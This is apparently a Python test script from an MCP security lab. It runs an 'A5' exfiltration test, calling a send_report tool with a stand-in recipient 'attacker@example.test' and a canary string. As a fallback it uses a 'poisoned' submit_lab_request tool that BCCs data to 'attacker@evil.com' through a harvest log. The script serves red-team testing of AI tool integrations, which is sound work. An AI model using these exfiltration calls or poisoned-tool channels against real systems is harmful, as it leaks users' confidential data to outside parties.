from __future__ import annotations

import argparse
import asyncio

from fastmcp import Client

from mcp_attack_common import (
    DEFAULT_URL,
    as_text,
    find_tool,
    list_tools,
    print_summary,
    read_harvest,
    tool_names,
    write_report,
)


async def main() -> None:
    parser = argparse.ArgumentParser(description="A5 report-generator exfiltration test.")
    parser.add_argument("--url", default=DEFAULT_URL)
    parser.add_argument("--recipient", default="attacker@example.test")
    parser.add_argument("--output-json", default="results/repro/mcp/a5_report_exfiltration.json")
    args = parser.parse_args()

    canary = "SECURITY_TEST_A5_REPORT_EXFIL"
    async with Client(args.url) as client:
        tools = await list_tools(client)
        names = tool_names(tools)

        report = {
            "attack_id": "a5_report_generator_exfiltration",
            "target": "Report Generator / send_report",
            "goal": "confidentiality",
            "url": args.url,
            "available_tools": names,
            "strict_target_available": "send_report" in names,
            "success": False,
            "partial_success": False,
            "success_reason": "",
        }

        if find_tool(tools, "send_report"):
            result = await client.call_tool(
                "send_report",
                {
                    "recipient_email": args.recipient,
                    "subject": "BF-042 audit package",
                    "report_content": f"Dry-run exfiltration test. {canary}",
                    "attachment_path": "",
                },
            )
            output = as_text(result)
            report.update(
                {
                    "tool_called": "send_report",
                    "tool_output": output,
                    "success": args.recipient in output or "sent" in output.lower() or canary in output,
                    "success_reason": "send_report existed and was called with lab-safe recipient.",
                }
            )
        elif find_tool(tools, "submit_lab_request"):
            # Surrogate exfil path available in current MCP build: poisoned submit_lab_request
            # writes a BCC entry to harvest.log. This is not strict A5, so mark partial.
            result = await client.call_tool(
                "submit_lab_request",
                {
                    "compound_id": "BF-042",
                    "test_type": "exfiltration-dry-run",
                    "notes": f"A5 surrogate report exfiltration test. recipient={args.recipient}. {canary}",
                },
            )
            harvest = read_harvest()
            report.update(
                {
                    "tool_called": "submit_lab_request",
                    "tool_output": as_text(result),
                    "harvest_log_tail": harvest[-2000:],
                    "partial_success": "[3D]" in harvest or canary in harvest or "attacker@evil.com" in harvest,
                    "success_reason": (
                        "Strict A5 send_report is not exposed. Used current poisoned submit_lab_request "
                        "as a surrogate exfiltration/BCC channel."
                    ),
                }
            )
        else:
            report["success_reason"] = "Neither send_report nor submit_lab_request is exposed."

        write_report(args.output_json, report)
        print_summary(report)


if __name__ == "__main__":
    asyncio.run(main())
